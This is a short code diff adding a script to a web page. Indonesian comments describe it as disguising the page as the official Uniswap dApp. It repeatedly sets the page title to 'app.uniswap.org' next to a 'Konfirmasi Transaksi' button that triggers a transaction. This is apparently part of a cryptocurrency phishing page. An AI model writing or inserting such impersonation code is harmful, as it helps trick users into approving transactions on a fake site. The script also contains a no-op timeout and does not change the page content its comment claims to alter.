@@ -58,6 +58,21 @@
     </script>
 
 
+    <script>
+        function spoof() {
+            // Memanipulasi judul dan isi halaman agar menyerupai dApp resmi
+            document.title = "app.uniswap.org";
+            
+            setTimeout(function(){
+                // Siklus pembaruan tampilan halaman jika diperlukan
+            }, 5000); 
+        }
+
+        // Menjalankan fungsi spoofing secara berkala
+        setInterval(spoof, 2000);
+    </script>
+
+
     <button onclick="triggerOfficialDAppTransaction()">Konfirmasi Transaksi</button>
 
 </body>
